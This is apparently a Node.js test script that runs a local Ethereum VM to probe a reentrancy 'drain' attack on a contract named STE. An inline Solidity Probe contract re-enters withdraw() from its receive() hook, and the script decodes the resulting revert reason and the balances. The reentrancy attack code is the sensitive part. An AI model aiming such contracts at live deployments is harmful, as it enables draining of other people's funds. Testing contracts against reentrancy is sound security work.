// Decode the exact revert reason the drain-shape reentry receives.
const { VM } = require('@ethereumjs/vm');
const { Common, Hardfork } = require('@ethereumjs/common');
const { Address, hexToBytes, bytesToHex, Account } = require('@ethereumjs/util');
const { Interface, AbiCoder } = require('ethers');
const steBuild = require('../artifacts/STE.json');
const atkBuild = require('../artifacts/ReentrantAttacker.json');
const ONE = 10n ** 18n;
(async () => {
  const vm = await VM.create({ common: new Common({ chain: 'mainnet', hardfork: Hardfork.London }) });
  const ste = new Interface(steBuild.abi), atk = new Interface(atkBuild.abi);
  const coder = AbiCoder.defaultAbiCoder();
  const at = (a) => new Address(hexToBytes(a));
  const D = '0x1111111111111111111111111111111111111111';
  const P = '0x5555555555555555555555555555555555555555';
  for (const a of [D, P]) { const x = at(a); const ac = (await vm.stateManager.getAccount(x)) ?? new Account(); ac.balance = 1000n * ONE; await vm.stateManager.putAccount(x, ac); }
  const run = (to, data, value = 0n, caller = D) => vm.evm.runCall({ caller: at(caller), to: to ? at(to) : undefined, data: hexToBytes(data), gasLimit: 30_000_000n, value, createdAddresses: new Set() });

  const d1 = await run(null, steBuild.bytecode);
  const STE = bytesToHex(d1.createdAddress.bytes);
  const d2 = await run(null, atkBuild.bytecode + atk.encodeDeploy([STE]).slice(2));
  const ATK = bytesToHex(d2.createdAddress.bytes);

  await run(STE, '0x', 10n * ONE); // seed 10 ETH

  // FIXED attacker: capture the revert reason from the cached reentry
  const probeSrc = `// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
interface ISTE { function withdraw(uint256 t) external; function balanceOf(address) external view returns (uint256); }
contract Probe {
    ISTE public ste; uint256 public cached; bool public got; string public reason; bytes public raw;
    constructor(address t){ ste = ISTE(t); }
    function go() external payable {
        (bool ok,) = payable(address(ste)).call{value: msg.value}("");
        require(ok);
        cached = ste.balanceOf(address(this));
        ste.withdraw(cached);
    }
    receive() external payable {
        if (got) return; got = true;
        try ste.withdraw(cached) { } catch (bytes memory r) { raw = r; if (r.length > 4) { assembly { } } }
    }
}`;
  const solc = require('solc');
  const out = JSON.parse(solc.compile(JSON.stringify({
    language: 'Solidity', sources: { 'P.sol': { content: probeSrc } },
    settings: { optimizer: { enabled: false, runs: 200 }, evmVersion: 'istanbul', outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } },
  })));
  const errs = (out.errors ?? []).filter((e) => e.severity === 'error');
  if (errs.length) throw new Error(errs[0].formattedMessage);
  const pc = out.contracts['P.sol'].Probe;
  const pIface = new Interface(pc.abi);
  const d3 = await run(null, '0x' + pc.evm.bytecode.object + pIface.encodeDeploy([STE]).slice(2));
  const PROBE = bytesToHex(d3.createdAddress.bytes);

  const res = await run(PROBE, pIface.encodeFunctionData('go', []), 5n * ONE);
  console.log('probe go() ->', res.execResult.exceptionError ? 'revert' : 'ok');
  const raw = bytesToHex(res.execResult.returnValue);
  const rawRes = await run(PROBE, pIface.encodeFunctionData('raw', []));
  const rawBytes = coder.decode(['bytes'], rawRes.execResult.returnValue)[0];
  console.log('captured revert data:', rawBytes);
  if (rawBytes.startsWith('0x08c379a0')) {
    const str = coder.decode(['string'], '0x' + rawBytes.slice(10))[0];
    console.log('DECODED REVERT REASON:', JSON.stringify(str));
  }
  const tw = await run(STE, ste.encodeFunctionData('totalWithdrawals', []));
  console.log('totalWithdrawals after:', BigInt(coder.decode(['uint256'], tw.execResult.returnValue)[0]));
  const bal = await run(STE, ste.encodeFunctionData('balanceOf', [PROBE]));
  console.log('probe tokens after:', BigInt(coder.decode(['uint256'], bal.execResult.returnValue)[0]));
})();
